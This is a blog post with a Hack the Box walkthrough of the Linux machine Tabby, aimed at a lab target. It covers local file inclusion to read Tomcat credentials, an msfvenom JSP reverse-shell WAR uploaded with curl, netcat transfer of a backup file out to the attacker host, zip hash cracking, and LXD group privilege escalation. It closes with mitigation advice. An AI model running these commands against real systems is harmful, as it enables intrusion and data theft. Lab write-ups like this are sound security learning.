<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Tabby" /><meta property="og:locale" content="en" /><meta name="description" content="This is my write up for the HackTheBox Linux machine Tabby." /><meta property="og:description" content="This is my write up for the HackTheBox Linux machine Tabby." /><link rel="canonical" href="https://tid4l.github.io/posts/HTB-Tabby/" /><meta property="og:url" content="https://tid4l.github.io/posts/HTB-Tabby/" /><meta property="og:site_name" content="TidalSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-01T13:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack the Box - Tabby" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-07-01T13:00:00-05:00","datePublished":"2020-07-01T13:00:00-05:00","description":"This is my write up for the HackTheBox Linux machine Tabby.","headline":"Hack the Box - Tabby","mainEntityOfPage":{"@type":"WebPage","@id":"https://tid4l.github.io/posts/HTB-Tabby/"},"url":"https://tid4l.github.io/posts/HTB-Tabby/"}</script><title>Hack the Box - Tabby | TidalSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="TidalSec"><meta name="application-name" content="TidalSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avi/avi.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">TidalSec</a></div><div class="site-subtitle font-italic">Cybersecurity.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tid4l" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack the Box - Tabby</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Tabby</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Chris</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1593626400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-07-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1585 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p>This is my write up for the HackTheBox Linux machine <em>Tabby</em>.</p><hr /><blockquote class="prompt-warning"><div><p>These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.</p></div></blockquote><p><img data-src="/assets/img/posts/htb/07-2020/info.PNG" alt="" data-proofer-ignore> <em>Task: Find <a href="#user-flag">user.txt</a> and <a href="#root-flag">root.txt</a></em></p><h2 id="penetration-methodologies"><span class="mr-2">Penetration Methodologies</span><a href="#penetration-methodologies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Scanning</strong></p><ul><li>nmap</ul><p><strong>Enumeration</strong></p><ul><li>Webpage enumeration</ul><p><strong>Exploitation</strong></p><ul><li>Local file inclusion</ul><p><strong>Priv Esc</strong></p><ul><li>LXD group policy abuse</ul><h2 id="user-flag"><span class="mr-2">User Flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s enumerate some info about <em>Tabby</em> with an <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><ul><li><p><strong>sC</strong>: Enable common scripts</p><li><p><strong>sV</strong>: version and service on the port</p><li><p><strong>O</strong>: remote OS detection using fingerprinting</p></ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Fri Jun 26 16:50:18 2020 as: nmap -sC -sV -O -oA scan191 10.10.10.191</span>
Nmap scan report <span class="k">for </span>10.10.10.191
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device <span class="o">(</span>91%<span class="o">)</span>, Linux 2.6.26 - 2.6.35 <span class="o">(</span>89%<span class="o">)</span>, OpenWrt Kamikaze 7.09 <span class="o">(</span>Linux 2.6.22<span class="o">)</span> <span class="o">(</span>89%<span class="o">)</span>, Linux 3.16 - 4.6 <span class="o">(</span>89%<span class="o">)</span>, Linux 2.6.32 - 3.13 <span class="o">(</span>88%<span class="o">)</span>, Linux 3.3 <span class="o">(</span>88%<span class="o">)</span>, Linux 2.6.23 - 2.6.38 <span class="o">(</span>88%<span class="o">)</span>, Linux 2.6.31 - 2.6.32 <span class="o">(</span>88%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>88%<span class="o">)</span>, Linux 2.6.32 - 2.6.39 <span class="o">(</span>88%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Tue Jun  2 16:52:39 2020 -- 1 IP address (1 host up) scanned in 141.22 seconds</span>
</pre></table></code></div></div><p>Our scan indicates that port 21 is visible, but closed. It also shows that port 80 is open, serving an HTTP webpage. The normal scan only checks the 1000 most popular ports, so let’s also run a full port scan.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.80 scan initiated Fri Jun 26 17:10:01 2020 as: nmap -O -sV -sC -p- -oN full194</span>
<span class="o">[</span>...]
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
<span class="o">[</span>...]
</pre></table></code></div></div><p>Our full scan also reveals that port 8080 is open and an HTTP webpage running Apache Tomcat is available. Let’s go ahead an enumerate the webpage on port 80 first.</p><p><img data-src="/assets/img/posts/htb/07-2020/megahost.png" alt="" data-proofer-ignore></p><p>The primary website looks like a frontend for a hosting service. A lot of information is available, especially about a recent data breach, but overall, the site doesn’t have anything that may prove useful.</p><p>However, something stands out on the <code class="language-plaintext highlighter-rouge">news.php</code> page. There is a <code class="language-plaintext highlighter-rouge">file</code> parameter in the URL and the value “statement” is being passed to it, which we can assume is the file name that is loaded to the page. If the input for the variable is not properly sanitized, we may be able to perform a directory traversal attack due to a <a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/">local file inclusion (LFI) vulnerability</a>.</p><p><img data-src="/assets/img/posts/htb/07-2020/dt-attack.png" alt="" data-proofer-ignore></p><p>Instead of guessing a file name and location we want to see, let’s enumerate port 8080 and return to this later.</p><p><img data-src="/assets/img/posts/htb/07-2020/tomcat.png" alt="" data-proofer-ignore></p><p>This looks like the default page for Apache Tomcat. Clicking the various links yields nothing useful, but the file paths throughout the page hint to the file system structure of the box. A quick search reveals that some tomcat credentials may be stored in the <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> file somewhere within the <code class="language-plaintext highlighter-rouge">Tomcat</code> directory.</p><p>We can also enumerate the version of Tomcat based on this page: version 9. The credentials for this version should be located at the file path <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/tomcat-users.xml</code>. This would be a great opportunity to go back to our potential LFI vulnerability at the <code class="language-plaintext highlighter-rouge">http://10.10.10.194/news.php?file=statement</code> page and see if we can retrieve this file.</p><p>We’ll capture the request to this page with Burp Suite so we can easily manipulate the <code class="language-plaintext highlighter-rouge">file</code> parameter. To traverse to a specific file, we’ll have to go back multiple directories with <code class="language-plaintext highlighter-rouge">../../</code> to get the root directory, then we can specify our full target file path. We have to do it quite a bit since we’re not sure where our current directory is. To avoid any misinterpretations with the slashes, we need to URL encode them. Let’s replace the “statement” variable with our encoded traversal and the full file path to the file we’re trying to retrieve.</p><p>Let’s send our request.</p><p><img data-src="/assets/img/posts/htb/07-2020/burp-dt.png" alt="" data-proofer-ignore></p><p>Success, we receive the file in our response.</p><p>Additionally, we also see the roles that the tomcat user has. The manager-script role allows us to remotely deploy web archive (WAR) files to the webserver, with our new found credentials.</p><p>First, we need to create a malicious WAR file. To do this, we’ll use <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.121 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> war <span class="o">&gt;</span> evil.war
</pre></table></code></div></div><p>Next, we’ll use curl to upload our file, utilizing the credentials we found.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>curl  <span class="nt">--upload-file</span> evil.war http://tomcat:<span class="se">\$</span>3cureP4s5w0rd123<span class="se">\!</span>@10.10.10.194:8080/manager/text/deploy?path<span class="o">=</span>/evil
</pre></table></code></div></div><p>Let’s start our listener in preparation for a reverse shell.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
</pre></table></code></div></div><p>Finally, navigating to <code class="language-plaintext highlighter-rouge">http://10.10.10.194:8080/evil/</code> triggers our payload, and we receive a reverse shell. We’ll also make our shell a little more interactive.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash");'</span>
</pre></table></code></div></div><p>Let’s look around where we landed. Enumerating a bit leads us to the <code class="language-plaintext highlighter-rouge">/var/www/html/files</code> directory. Here, we find a zipped backup named <code class="language-plaintext highlighter-rouge">16162020_backup.zip</code>. Let’s use <code class="language-plaintext highlighter-rouge">netcat</code> to download this to our machine and give it a look.</p><p>On our machine, we’ll listen for a callback with the file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lp</span> 5555 <span class="o">&gt;</span> backup.zip
</pre></table></code></div></div><p>On the <em>Tabby</em> box let’s run the following command to send it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-w</span> 3 10.10.14.121 5555 &lt; 16162020_backup.zip
</pre></table></code></div></div><p>Attempting to open the zip prompts for a password. We can extract password hashes with zip2john or one of the various online extractors. I had problmes with zip2john, so I went with an <a href="https://www.onlinehashcrack.com/tools-zip-rar-7z-archive-hash-extractor.php">online tool</a>.</p><p><img data-src="/assets/img/posts/htb/07-2020/zip-hash.png" alt="" data-proofer-ignore></p><p>We’ll save the output into a file named <code class="language-plaintext highlighter-rouge">zip.hash</code> and use john to crack it.</p><p><img data-src="/assets/img/posts/htb/07-2020/john.png" alt="" data-proofer-ignore></p><p>The hash cracks and we receive a password: admin@it. In the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, we find the user ash is present on the box. Let’s see if we can change users with our new password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>su ash
</pre></table></code></div></div><p>It works! We’ve successfully moved to ash. Let’s grab the first flag.</p><p><img data-src="/assets/img/posts/htb/07-2020/user-flag.png" alt="" data-proofer-ignore></p><h2 id="root-flag"><span class="mr-2">Root Flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>On to root. First thing, let’s do a bit of enumeration with the user ash. Just to check out own privileges, we’ll run the <code class="language-plaintext highlighter-rouge">id</code> and <code class="language-plaintext highlighter-rouge">sudo -l</code> commands. <code class="language-plaintext highlighter-rouge">sudo -l</code> is of little use, but <code class="language-plaintext highlighter-rouge">id</code> reveals the groups that ash is apart of, the most interesting being lxd.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
</pre></table></code></div></div><p>A little research reveals that LXD, a container technology, can be used to <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">perform privilege escalation</a>.</p><p>Essentially, we’re going to build a Linux Container with ash, duplicating the host file system, then we can open a shell as root within our container, allowing us to enumerate the file system of the host machine in a privileged context.</p><p>First, let’s grab the LXD image that we’ll use for the privilege escalation. We’ll also run the <code class="language-plaintext highlighter-rouge">build-alpine</code> script to create the image.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
<span class="nv">$ </span><span class="nb">sudo </span>bash build-alpine
</pre></table></code></div></div><p>On the target machine, we’ll start a <code class="language-plaintext highlighter-rouge">netcat</code> listener in preparation to download the image.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lp</span> 5555 <span class="o">&gt;</span> alpine-v3.12-x86_64-20200701_1818.tar.gz
</pre></table></code></div></div><p>Next, we’ll execute the following command on our box to start the transfer.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-w</span> 3 10.10.10.194 5555 &lt; alpine-v3.12-x86_64-20200701_1818.tar.gz
</pre></table></code></div></div><p>Now, we’ll switch back to the machine and add the image to LXD with the following command. We’ll also list the images to make sure it worked.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>lxc image import alpine-v3.12-x86_64-20200701_1818.tar.gz <span class="nt">--alias</span> pe4me
<span class="nv">$ </span>lxc image list
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| pe4me | e75871098130 | no     | alpine v3.12 <span class="o">(</span>20200701_18:18<span class="o">)</span> | x86_64       | CONTAINER | 3.05MB | Jul 2, 2020 at 12:05am <span class="o">(</span>UTC<span class="o">)</span> |
+-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
</pre></table></code></div></div><p>Looks to be there. Finally let’s run this series of commands that will prepare the container.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>lxd init <span class="nt">--auto</span>
<span class="nv">$ </span>lxc init pe4me ignite <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
<span class="nv">$ </span>lxc config device add ignite mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
<span class="nv">$ </span>lxc start ignite
</pre></table></code></div></div><p>With everything prepared, we’ll execute this final command to open a shell as root.</p><p><img data-src="/assets/img/posts/htb/07-2020/pe-root.png" alt="" data-proofer-ignore></p><p>Success! Let’s navigate to where the image is mounted and grab our final flag!</p><p><img data-src="/assets/img/posts/htb/07-2020/root-flag.png" alt="" data-proofer-ignore></p><hr /><h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>It’s important to be aware of what a Local File Inclusion vulnerability looks like and the impact of one existing on a webpage. The best practice is to create a whitelist for filenames to prevent displaying sensitive files. Additionally, identifiers should be used in place of the actual filename and should call the file themselves. <a href="https://www.pivotpointsecurity.com/blog/file-inclusion-vulnerabilities/">This article</a> from PivotPoint Security provides some great details.</p><li><p>Avoid leaving the default page or pages for a web server environment. This can provide an attacker with invaluable data about version, applications, etc.. Without the default Apache Tomcat page revealing the version and file location information, it would have been much more difficult to produce anything of substance with the LFI vulnerability.</p><li><p>Due to the power of a user in the lxd group, they should be treated with as much caution and security as the root user. <a href="https://shenaniganslabs.io/2019/05/21/LXD-LPE.html">According to Shenanigans Labs</a>: “The LXD team has updated their documentation to warn not to add users to the lxd group unless you trust them with root level access to your host.”</p></ul><h2 id="final-thoughts"><span class="mr-2">Final Thoughts</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was a fun box. I enjoyed that the path to root wasn’t necessarily a string of severe vulnerabilities, but mostly misconfigurations that were abused because of the LFI. Without it, the other issues would not have been exasperated. Abusing the lxd group was also interesting to see and step through.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Tabby - TidalSec&amp;url=https://tid4l.github.io/posts/HTB-Tabby/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Tabby - TidalSec&amp;u=https://tid4l.github.io/posts/HTB-Tabby/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tid4l.github.io/posts/HTB-Tabby/&amp;text=Hack the Box - Tabby - TidalSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/">First Post and Obligatory Blog Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><script 